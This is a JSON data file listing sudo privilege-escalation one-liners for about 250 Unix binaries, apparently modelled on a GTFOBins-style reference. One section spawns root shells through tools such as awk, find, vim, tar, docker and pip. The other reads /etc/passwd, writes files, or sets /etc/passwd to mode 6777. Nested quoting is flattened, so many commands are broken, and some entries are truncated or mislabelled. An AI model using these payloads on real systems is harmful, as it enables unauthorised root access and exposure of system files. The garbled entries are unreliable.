{
    "su": {
        "aa-exec": "sudo aa-exec /bin/sh",
        "ansible-playbook": "TF=$(mktemp); echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF; sudo ansible-playbook $TF",
        "ansible-test": "sudo ansible-test shell",
        "aoss": "sudo aoss /bin/sh",
        "aria2c": "COMMAND='id'; TF=$(mktemp); echo '$COMMAND' > $TF; chmod +x $TF; sudo aria2c --on-download-error=$TF http://x",
        "ash": "sudo ash",
        "at": "echo '/bin/sh <$(tty) >$(tty) 2>$(tty)' | sudo at now; tail -f /dev/null",
        "awk": "sudo awk 'BEGIN {system('/bin/sh')}'",
        "bash": "sudo bash",
        "bconsole": "sudo bconsole; @exec /bin/sh",
        "bpftrace": "sudo bpftrace -e 'BEGIN {system('/bin/sh');exit()}'",
        "busybox": "sudo busybox sh",
        "byebug": "TF=$(mktemp); echo 'system('/bin/sh')' > $TF; sudo byebug $TF; continue",
        "c89": "sudo c89 -wrapper /bin/sh,-s .",
        "c99": "sudo c99 -wrapper /bin/sh,-s .",
        "cabal": "sudo cabal exec -- /bin/sh",
        "capsh": "sudo capsh --",
        "cdist": "sudo cdist shell -s /bin/sh",
        "certbot": "TF=$(mktemp -d); sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'",
        "check_by_ssh": "sudo check_by_ssh -o 'ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)' -H localhost -C xx",
        "choom": "sudo choom -n 0 /bin/sh",
        "chroot": "sudo chroot /",
        "cobc": "TF=$(mktemp -d); echo 'CALL 'SYSTEM' USING '/bin/sh'.' > $TF/x; sudo cobc -xFj --frelax-syntax-checks $TF/x",
        "composer": "TF=$(mktemp -d); echo '{'scripts':{'x':'/bin/sh -i 0<&3 1>&3 2>&3'}}' >$TF/composer.json; sudo composer --working-dir=$TF run-script x",
        "cowsay": "TF=$(mktemp); echo 'exec '/bin/sh';' >$TF; sudo cowsay -f $TF x",
        "cowthink": "TF=$(mktemp); echo 'exec '/bin/sh';' >$TF; sudo cowthink -f $TF x",
        "cpio": "echo '/bin/sh </dev/tty >/dev/tty' >localhost; sudo cpio -o --rsh-command /bin/sh -F localhost:",
        "cpulimit": "sudo cpulimit -l 100 -f /bin/sh",
        "csh": "sudo csh",
        "csvtool": "sudo csvtool call '/bin/sh;false' /etc/passwd",
        "dash": "sudo dash",
        "debugfs": "sudo debugfs; !/bin/sh",
        "distcc": "sudo distcc /bin/sh",
        "dmsetup": "sudo dmsetup create base <<EOF; 0 3534848 linear /dev/loop0 94208; EOF; sudo dmsetup ls --exec '/bin/sh -s'",
        "dnf": "TF=$(mktemp -d); echo 'id' > $TF/x.sh; fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF; ",
        "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "dotnet": "sudo dotnet fsi; System.Diagnostics.Process.Start('/bin/sh').WaitForExit();;",
        "dstat": "echo 'import os; os.execv('/bin/sh', ['sh'])' >/usr/local/share/dstat/dstat_xxx.py; sudo dstat --xxx",
        "easy_install": "TF=$(mktemp -d); echo 'import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')' > $TF/setup.py; sudo easy_install $TF",
        "eb": "sudo eb logs; !/bin/sh",
        "ed": "sudo ed; !/bin/sh",
        "elvish": "sudo elvish",
        "emacs": "sudo emacs -Q -nw --eval '(term '/bin/sh')'",
        "env": "sudo env /bin/sh",
        "ex": "sudo ex; !/bin/sh",
        "expect": "sudo expect -c 'spawn /bin/sh;interact'",
        "facter": "TF=$(mktemp -d); echo 'exec('/bin/sh')' > $TF/x.rb; sudo FACTERLIB=$TF facter",
        "find": "sudo find . -exec /bin/sh \\\\; -quit",
        "fish": "sudo fish",
        "flock": "sudo flock -u / /bin/sh",
        "ftp": "sudo ftp; !/bin/sh",
        "gawk": "sudo gawk 'BEGIN {system('/bin/sh')}'",
        "gcc": "sudo gcc -wrapper /bin/sh,-s .",
        "gcore": "sudo gcore $PID",
        "gdb": "sudo gdb -nx -ex '!sh' -ex quit",
        "genie": "sudo genie -c '/bin/sh'",
        "ghc": "sudo ghc -e 'System.Process.callCommand '/bin/sh''",
        "ghci": "sudo ghci; System.Process.callCommand '/bin/sh'",
        "gimp": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system('sh')'",
        "ginsh": "sudo ginsh; !/bin/sh",
        "git": "sudo PAGER='sh -c 'exec sh 0<&1'' git -p help",
        "grc": "sudo grc --pty /bin/sh",
        "gtester": "TF=$(mktemp); echo '#!/bin/sh' > $TF; echo 'exec /bin/sh 0<&1' >> $TF; chmod +x $TF; sudo gtester -q $TF",
        "hping3": "sudo hping3; /bin/sh",
        "iftop": "sudo iftop; !/bin/sh",
        "ionice": "sudo ionice /bin/sh",
        "irb": "sudo irb; exec '/bin/bash'",
        "ispell": "sudo ispell /etc/passwd; !/bin/sh",
        "jjs": "echo 'Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\\\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()' | sudo jjs",
        "joe": "sudo joe; ^K!/bin/sh",
        "journalctl": "sudo journalctl; !/bin/sh",
        "jrunscript": "sudo jrunscript -e 'exec('/bin/sh -c \\\\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')'",
        "jtag": "sudo jtag --interactive; shell /bin/sh",
        "julia": "sudo julia -e 'run(`/bin/sh`)'",
        "knife": "sudo knife exec -E 'exec '/bin/sh''",
        "ksh": "sudo ksh",
        "ksu": "sudo ksu -q -e /bin/sh",
        "latexmk": "sudo latexmk -e 'exec '/bin/sh';'",
        "ld.so": "sudo /lib/ld.so /bin/sh",
        "ldconfig": "TF=$(mktemp -d); echo '$TF' > '$TF/conf'; # move malicious libraries in $TF; sudo ldconfig -f '$TF/conf'",
        "lftp": "sudo lftp -c '!/bin/sh'",
        "ln": "sudo ln -fs /bin/sh /bin/ln; sudo ln",
        "loginctl": "sudo loginctl user-status; !/bin/sh",
        "logsave": "sudo logsave /dev/null /bin/sh -i",
        "ltrace": "sudo ltrace -b -L /bin/sh",
        "lua": "sudo lua -e 'os.execute('/bin/sh')'",
        "lualatex": "sudo lualatex -shell-escape '\\\\documentclass{article}\\\\begin{document}\\\\directlua{os.execute('/bin/sh')}\\\\end{document}'",
        "luatex": "sudo luatex -shell-escape '\\\\directlua{os.execute('/bin/sh')}\\\\end'",
        "mail": "sudo mail --exec='!/bin/sh'",
        "make": "COMMAND='/bin/sh'; sudo make -s --eval=$'x:\\\\n\\\\t-''$COMMAND'",
        "man": "sudo man man; !/bin/sh",
        "mawk": "sudo mawk 'BEGIN {system('/bin/sh')}'",
        "msfconsole": "sudo msfconsole; msf6 > irb; >> system('/bin/sh')",
        "multitime": "sudo multitime /bin/sh",
        "mysql": "sudo mysql -e '\\\\! /bin/sh'",
        "nano": "sudo nano; ^R^X; reset; sh 1>&0 2>&0",
        "nawk": "sudo nawk 'BEGIN {system('/bin/sh')}'",
        "ncftp": "sudo ncftp; !/bin/sh",
        "neofetch": "TF=$(mktemp); echo 'exec /bin/sh' >$TF; sudo neofetch --config $TF",
        "nice": "sudo nice /bin/sh",
        "nmap": "TF=$(mktemp); echo 'os.execute('/bin/sh')' > $TF; sudo nmap --script=$TF",
        "node": "sudo node -e 'require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]})'",
        "nohup": "sudo nohup /bin/sh -c 'sh <$(tty) >$(tty) 2>$(tty)'",
        "nroff": "TF=$(mktemp -d); echo '#!/bin/sh' > $TF/groff; echo '/bin/sh' >> $TF/groff; chmod +x $TF/groff; sudo GROFF_BIN_PATH=$TF nroff",
        "nsenter": "sudo nsenter /bin/sh",
        "octave": "sudo octave-cli --eval 'system('/bin/sh')'",
        "openssl": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port 12345; ",
        "openvpn": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'",
        "openvt": "COMMAND=/bin/bash; TF=$(mktemp -u); sudo openvt -- sh -c '$COMMAND >$TF 2>&1'; cat $TF",
        "opkg": "TF=$(mktemp -d); echo 'exec /bin/sh' > $TF/x.sh; fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF; ",
        "pdb": "TF=$(mktemp); echo 'import os; os.system('/bin/sh')' > $TF; sudo pdb $TF; cont",
        "pdftex": "sudo pdftex --shell-escape '\\\\write18{/bin/sh}\\\\end'",
        "perf": "sudo perf stat /bin/sh",
        "perl": "sudo perl -e 'exec '/bin/sh';'",
        "perlbug": "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'",
        "pexec": "sudo pexec /bin/sh",
        "php": "CMD='/bin/sh'; sudo php -r 'system('$CMD');'",
        "pic": "sudo pic -U; .PS; sh X sh X",
        "pico": "sudo pico; ^R^X; reset; sh 1>&0 2>&0",
        "pidstat": "COMMAND=/bin/bash; sudo pidstat -e $COMMAND",
        "pip": "TF=$(mktemp -d); echo 'import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')' > $TF/setup.py; sudo pip install $TF",
        "pkexec": "sudo pkexec /bin/sh",
        "pkg": "TF=$(mktemp -d); echo 'id' > $TF/x.sh; fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF; ",
        "posh": "sudo posh",
        "pry": "sudo pry; system('/bin/sh')",
        "psftp": "sudo psftp; !/bin/sh",
        "psql": "psql; \\\\?; !/bin/sh",
        "puppet": "sudo puppet apply -e 'exec { '/bin/sh -c \\\\'exec sh -i <$(tty) >$(tty) 2>$(tty)\\\\'': }'",
        "pwsh": "sudo pwsh",
        "python": "sudo python -c 'import os; os.system('/bin/sh')'",
        "rake": "sudo rake -p '`/bin/sh 1>&0`'",
        "rc": "sudo rc -c '/bin/sh'",
        "rlwrap": "sudo rlwrap /bin/sh",
        "rpm": "sudo rpm --eval '%{lua:os.execute('/bin/sh')}'",
        "rpmdb": "sudo rpmdb --eval '%(/bin/sh 1>&2)'",
        "rpmquery": "sudo rpmquery --eval '%{lua:posix.exec('/bin/sh')}'",
        "rpmverify": "sudo rpmverify --eval '%(/bin/sh 1>&2)'",
        "rsync": "sudo rsync -e 'sh -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null",
        "ruby": "sudo ruby -e 'exec '/bin/sh''",
        "run-parts": "sudo run-parts --new-session --regex '^sh$' /bin",
        "runscript": "TF=$(mktemp); echo '! exec /bin/sh' >$TF; sudo runscript $TF",
        "sash": "sudo sash",
        "scanmem": "sudo scanmem; shell /bin/sh",
        "scp": "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x '$TF'; sudo scp -S $TF x y:",
        "screen": "sudo screen",
        "script": "sudo script -q /dev/null",
        "scrot": "sudo scrot -e /bin/sh",
        "service": "sudo service ../../bin/sh",
        "setarch": "sudo setarch $(arch) /bin/sh",
        "setlock": "sudo setlock - /bin/sh",
        "sg": "sudo sg root",
        "slsh": "sudo slsh -e 'system('/bin/sh')'",
        "snap": "COMMAND=/bin/bash; cd $(mktemp -d); mkdir -p meta/hooks; printf '#!/bin/sh\\\\n%s; false' '$COMMAND' >meta/hooks/install; chmod +x meta/hooks/install; fpm -n xxxx -s dir -t snap -a all meta; ",
        "socat": "sudo socat stdin exec:/bin/sh",
        "softlimit": "sudo softlimit /bin/sh",
        "split": "sudo split --filter=/bin/sh /dev/stdin",
        "sqlite3": "sudo sqlite3 /dev/null '.shell /bin/sh'",
        "sqlmap": "sudo sqlmap -u 127.0.0.1 --eval='import os; os.system('/bin/sh')'",
        "ssh-agent": "sudo ssh-agent /bin/",
        "ssh-keygen": "sudo ssh-keygen -D ./lib.so",
        "ssh": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        "sshpass": "sudo sshpass /bin/sh",
        "start-stop-daemon": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh",
        "stdbuf": "sudo stdbuf -i0 /bin/sh",
        "strace": "sudo strace -o /dev/null /bin/sh",
        "su": "sudo su",
        "sysctl": "COMMAND='/bin/sh -c id>/tmp/id'; sudo sysctl 'kernel.core_pattern=|$COMMAND'; sleep 9999 &; kill -QUIT $!; cat /tmp/id",
        "systemctl": "TF=$(mktemp); echo /bin/sh >$TF; chmod +x $TF; sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice",
        "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "task": "sudo task execute /bin/sh",
        "taskset": "sudo taskset 1 /bin/sh",
        "tasksh": "sudo tasksh; !/bin/sh",
        "tclsh": "sudo tclsh; exec /bin/sh <@stdin >@stdout 2>@stderr",
        "tcpdump": "COMMAND='id'; TF=$(mktemp); echo '$COMMAND' > $TF; chmod +x $TF; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root",
        "tdbtool": "sudo tdbtool; ! /bin/sh",
        "tex": "sudo tex --shell-escape '\\\\write18{/bin/sh}\\\\end'",
        "time": "sudo /usr/bin/time /bin/sh",
        "timedatectl": "sudo timedatectl list-timezones; !/bin/sh",
        "timeout": "sudo timeout --foreground 7d /bin/sh",
        "tmate": "sudo tmate -c /bin/sh",
        "tmux": "sudo tmux",
        "top": "echo -e 'pipe\\\\tx\\\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc; sudo top; # press return twice; reset",
        "torify": "sudo torify /bin/sh",
        "torsocks": "sudo torsocks /bin/sh",
        "unshare": "sudo unshare /bin/sh",
        "unsquashfs": "sudo unsquashfs shell; ./squashfs-root/sh -p",
        "unzip": "sudo unzip -K shell.zip; ./sh -p",
        "valgrind": "sudo valgrind /bin/sh",
        "vi": "sudo vi -c ':!/bin/sh' /dev/null",
        "view": "sudo view -c ':!/bin/sh'",
        "vigr": "sudo vigr",
        "vim": "sudo vim -c ':!/bin/sh'",
        "vimdiff": "sudo vimdiff -c ':!/bin/sh'",
        "vipw": "sudo vipw",
        "watch": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
        "wget": "TF=$(mktemp); chmod +x $TF; echo -e '#!/bin/sh\\\\n/bin/sh 1>&0' >$TF; sudo wget --use-askpass=$TF 0",
        "wish": "sudo wish; exec /bin/sh <@stdin >@stdout 2>@stderr",
        "xargs": "sudo xargs -a /dev/null sh",
        "xdg-user-dir": "sudo xdg-user-dir '}; /bin/sh #'",
        "xdotool": "sudo xdotool exec --sync /bin/sh",
        "xetex": "sudo xetex --shell-escape '\\\\write18{/bin/sh}\\\\end'",
        "yarn": "sudo yarn exec /bin/sh",
        "yash": "sudo yash",
        "yum": "TF=$(mktemp -d); echo 'id' > $TF/x.sh; fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF; ",
        "zathura": "sudo zathura; :! /bin/sh -c 'exec /bin/sh 0<&1'",
        "zip": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'; sudo rm $TF",
        "zsh": "sudo zsh"
    },
    "file": {
        "7z": "LFILE=/etc/passwd; sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so",
        "alpine": "LFILE=/etc/passwd; sudo alpine -F '$LFILE'",
        "ar": "TF=$(mktemp -u); sudo ar r '$TF' '/etc/passwd'; cat '$TF'",
        "arp": "LFILE=/etc/passwd; sudo arp -v -f '$LFILE'",
        "ascii-xfr": "sudo ascii-xfr -ns '/etc/passwd'",
        "ascii85": "LFILE=/etc/passwd; sudo ascii85 '$LFILE' | ascii85 --decode",
        "base32": "sudo base32 '/etc/passwd' | base32 --decode",
        "base58": "sudo base58 '/etc/passwd' | base58 --decode",
        "base64": "sudo base64 '/etc/passwd' | base64 --decode",
        "basenc": "LFILE=/etc/passwd; sudo basenc --base64 $LFILE | basenc -d --base64",
        "basez": "LFILE=/etc/passwd; sudo basez '$LFILE' | basez --decode",
        "batcat": "sudo batcat --paging always /etc/profile; !/bin/sh",
        "bc": "LFILE=/etc/passwd; sudo bc -s $LFILE; quit",
        "bridge": "LFILE=/etc/passwd; sudo bridge -b '$LFILE'",
        "bzip2": "LFILE=/etc/passwd; sudo bzip2 -c $LFILE | bzip2 -d",
        "cat": "sudo cat '/etc/passwd'",
        "check_cups": "LFILE=/etc/passwd; sudo check_cups --extra-opts=@$LFILE",
        "check_log": "LFILE=output.txt; INPUT=input_file; sudo check_log -F $INPUT -O $LFILE",
        "check_memory": "LFILE=/etc/passwd; sudo check_memory --extra-opts=@$LFILE",
        "check_raid": "LFILE=/etc/passwd; sudo check_raid --extra-opts=@$LFILE",
        "check_statusfile": "LFILE=/etc/passwd; sudo check_statusfile $LFILE",
        "chmod": "sudo chmod 6777 /etc/passwd",
        "chown": "sudo chown $(id -un):$(id -gn) /etc/passwd",
        "clamscan": "LFILE=/etc/passwd; TF=$(mktemp -d); touch $TF/empty.yara; sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\\\1/p'",
        "column": "LFILE=/etc/passwd; sudo column $LFILE",
        "csplit": "LFILE=/etc/passwd; csplit $LFILE 1; cat xx01",
        "cupsfilter": "LFILE=/etc/passwd; sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE",
        "cut": "sudo cut -d '' -f1 '/etc/passwd'",
        "dialog": "LFILE=/etc/passwd; sudo dialog --textbox '$LFILE' 0 0",
        "efax": "LFILE=/etc/passwd; sudo efax -d '$LFILE'",
        "espeak": "LFILE=/etc/passwd; sudo espeak -qXf '$LFILE'",
        "expand": "sudo expand '/etc/passwd'",
        "fmt": "sudo fmt -999 '/etc/passwd'",
        "fold": "sudo fold -w99999999 '/etc/passwd'",
        "genisoimage": "LFILE=/etc/passwd; sudo genisoimage -q -o - '$LFILE'",
        "grep": "LFILE=/etc/passwd; sudo grep '' $LFILE",
        "highlight": "LFILE=/etc/passwd; sudo highlight --no-doc --failsafe '$LFILE'",
        "join": "LFILE=/etc/passwd; sudo join -a 2 /dev/null $LFILE",
        "jq": "LFILE=/etc/passwd; sudo jq -Rr . '$LFILE'",
        "ksshell": "LFILE=/etc/passwd; sudo ksshell -i $LFILE",
        "mosquitto": "LFILE=/etc/passwd; sudo mosquitto -c '$LFILE'",
        "msgattrib": "LFILE=/etc/passwd; sudo msgattrib -P $LFILE",
        "msgcat": "LFILE=/etc/passwd; sudo msgcat -P $LFILE",
        "msgconv": "LFILE=/etc/passwd; sudo msgconv -P $LFILE",
        "msgmerge": "LFILE=/etc/passwd; sudo msgmerge -P $LFILE /dev/null",
        "msguniq": "LFILE=/etc/passwd; sudo msguniq -P $LFILE",
        "mtr": "LFILE=/etc/passwd; sudo mtr --raw -F '$LFILE'",
        "nft": "LFILE=/etc/passwd; sudo nft -f '$LFILE'",
        "nl": "LFILE=/etc/passwd; sudo nl -bn -w1 -s '' $LFILE",
        "pandoc": "LFILE=output.txt; echo DATA | sudo pandoc -t plain -o '$LFILE'",
        "paste": "LFILE=/etc/passwd; sudo paste $LFILE",
        "pg": "sudo pg /etc/profile; !/bin/sh",
        "pr": "LFILE=/etc/passwd; pr -T $LFILE",
        "red": "sudo red output.txt; a; DATA; .; w; q",
        "redcarpet": "LFILE=/etc/passwd; sudo redcarpet '$LFILE'",
        "rev": "LFILE=/etc/passwd; sudo rev $LFILE | rev",
        "tbl": "LFILE=/etc/passwd; sudo tbl $LFILE",
        "terraform": "sudo terraform console; file('/etc/passwd')",
        "troff": "LFILE=/etc/passwd; sudo troff $LFILE",
        "uudecode": "LFILE=/etc/passwd; sudo uuencode '$LFILE' /dev/stdout | uudecode",
        "uuencode": "LFILE=/etc/passwd; sudo uuencode '$LFILE' /dev/stdout | uudecode",
        "vagrant": "cd $(mktemp -d); echo 'exec '/bin/sh'' > Vagrantfile; vagrant up",
        "w3m": "LFILE=/etc/passwd; sudo w3m '$LFILE' -dump",
        "xelatex": "sudo xelatex '\\\\documentclass{article}\\\\usepackage{verbatim}\\\\begin{document}\\\\verbatiminput{/etc/passwd}\\\\end{document}'; strings article.dvi",
        "xpad": "LFILE=/etc/passwd; sudo xpad -f '$LFILE'",
        "xxd": "LFILE=/etc/passwd; sudo xxd '$LFILE' | xxd -r",
        "zsoelim": "LFILE=/etc/passwd; sudo zsoelim '$LFILE'"
    }
}